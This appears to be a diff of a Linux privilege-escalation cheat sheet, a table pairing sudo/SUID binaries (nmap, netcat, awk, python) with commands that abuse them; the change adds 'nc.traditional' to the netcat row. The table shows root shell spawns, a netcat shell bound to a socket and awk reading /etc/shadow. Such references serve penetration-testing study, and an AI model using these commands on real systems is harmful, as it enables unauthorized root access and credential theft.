@@ -34,7 +34,7 @@ If any of the following commands appear on the list of SUID or SUDO commands, th
 |---------------------------------------|-------------------------------------------------------------------------------------|
 | (ALL : ALL ) ALL                      | You can run any command as root.<br> sudo /bin/bash                                 |
 | nmap<br>(older versions 2.02 to 5.21) | nmap --interactive<br>!sh                                                           |
-| netcat<br>nc                          | nc -nlvp 4444 &<br> nc -e /bin/bash 127.0.0.1 4444                                  |
+| netcat<br>nc<br>nc.traditional        | nc -nlvp 4444 &<br> nc -e /bin/bash 127.0.0.1 4444                                  |
 | ncat                                  |                                                                                     |
 | awk <br>gawk                          | awk '{ print }' /etc/shadow <br> awk 'BEGIN {system("id")}'                         |
 | python                                | python -c 'import pty;pty.spawn("/bin/bash")'                                       |
